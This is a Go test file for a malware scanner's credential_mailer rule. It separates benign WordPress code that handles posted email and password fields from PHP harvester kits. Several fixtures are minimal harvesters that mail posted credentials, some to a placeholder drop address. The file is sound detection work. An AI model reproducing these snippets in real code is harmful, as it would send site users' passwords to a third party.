package signatures

import (
	"encoding/json"
	"os"
	"testing"
)

// credential_mailer used to be bare co-occurrence of the literals "mail(",
// "$_POST['email']" and "$_POST['password']". "mail(" is a substring of
// get_user_email(, sanitize_email(, resend_email( and wp_mail(, so any plugin
// screen that logs a user into a vendor account or registers one matched, and
// the realtime engine reported it Critical. These samples pin the shapes the
// rule must separate.

// A plugin connecting the site to its vendor cloud account: both credential
// fields are posted, and the only "mail(" in the file is the tail of an
// identifier. This is the live false positive.
const cookieYesAccountLogin = `<?php
class CLI_Cookieyes {
	public function get_user_email() {
		return sanitize_email( $this->user_email );
	}
	public function resend_email() {
		return $this->api_post( 'resend', array( 'email' => $this->get_user_email() ) );
	}
	public function connect() {
		$email    = isset( $_POST['email'] ) ? sanitize_email( wp_unslash( $_POST['email'] ) ) : '';
		$password = isset( $_POST['password'] ) ? $_POST['password'] : '';
		return wp_remote_post(
			$this->api . '/login',
			array( 'body' => array( 'email' => $email, 'password' => $password ) )
		);
	}
}`

// Registration handlers that create the account from posted credentials and
// then send the welcome notice through wp_mail. The corpus baseline recorded
// four of these across Elementor and WooCommerce add-ons.
const registrationWelcomeMail = `<?php
$email    = sanitize_email( $_POST['email'] );
$password = $_POST['password'];
$user_id  = wp_create_user( $email, $password, $email );
wp_mail( $email, __( 'Welcome', 'shop' ), $message );`

func TestCredentialMailerIgnoresVendorAccountLogin(t *testing.T) {
	s := loadRepoScanner(t)
	if hasRule(s.ScanContent([]byte(cookieYesAccountLogin), ".php"), "credential_mailer") {
		t.Error("credential_mailer FP: matched a plugin logging in to its vendor cloud account")
	}
}

func TestCredentialMailerIgnoresRegistrationMail(t *testing.T) {
	s := loadRepoScanner(t)
	if hasRule(s.ScanContent([]byte(registrationWelcomeMail), ".php"), "credential_mailer") {
		t.Error("credential_mailer FP: matched a registration handler mailing a welcome notice")
	}
}

// wp_mail is not the mail() builtin. A rule keyed on the substring cannot tell
// them apart, so a harvester that routes through wp_mail is out of scope here
// and the site's own wp_mail calls must stay quiet.
func TestCredentialMailerIgnoresWpMailWithPostedCredentials(t *testing.T) {
	s := loadRepoScanner(t)
	body := []byte(`<?php
$email    = $_POST['email'];
$password = $_POST['password'];
wp_mail( get_option( 'admin_email' ), 'New signup', 'A new account was created.' );`)
	if hasRule(s.ScanContent(body, ".php"), "credential_mailer") {
		t.Error("credential_mailer FP: wp_mail is not the mail() builtin")
	}
}

func TestCredentialMailerDetectsHarvesterKits(t *testing.T) {
	kits := map[string]string{
		"posted fields inside the mail call": `<?php
mail( $to, 'creds', $_POST['email'] . ':' . $_POST['password'] );`,
		"named variables interpolated into the body": `<?php
$email    = $_POST['email'];
$password = $_POST['password'];
mail( $rcpt, 'x', "user=$email pass=$password" );`,
		"short names mailed to a hardcoded drop box": `<?php
$e = $_POST['email'];
$p = $_POST['password'];
mail( 'drop@collector.example.test', 'result', "$e|$p" );`,
		"double-quoted field names": `<?php
$e = $_POST["email"];
$p = $_POST["password"];
mail( 'drop@collector.example.test', 'result', $e . '|' . $p );`,
	}
	s := loadRepoScanner(t)
	for name, kit := range kits {
		t.Run(name, func(t *testing.T) {
			if !hasRule(s.ScanContent([]byte(kit), ".php"), "credential_mailer") {
				t.Error("credential_mailer regression: harvester not detected")
			}
		})
	}
}

// The YARA rule measures regex spans in bytes and only folds ASCII case.
// UTF-8 must not make the realtime rule accept a wider span or a different
// PHP identifier from the one the scheduled scanner sees.
func TestCredentialMailerByteParity(t *testing.T) {
	s := loadRepoScanner(t)
	var tests []struct {
		Name, Sample string
		Want         bool
	}
	data, err := os.ReadFile("testdata/credential_mailer.json")
	if err != nil {
		t.Fatal(err)
	}
	if err := json.Unmarshal(data, &tests); err != nil {
		t.Fatal(err)
	}

	for _, tt := range tests {
		t.Run(tt.Name, func(t *testing.T) {
			if got := hasRule(s.ScanContent([]byte(tt.Sample), ".php"), "credential_mailer"); got != tt.Want {
				t.Errorf("match = %v, want %v", got, tt.Want)
			}
		})
	}
}
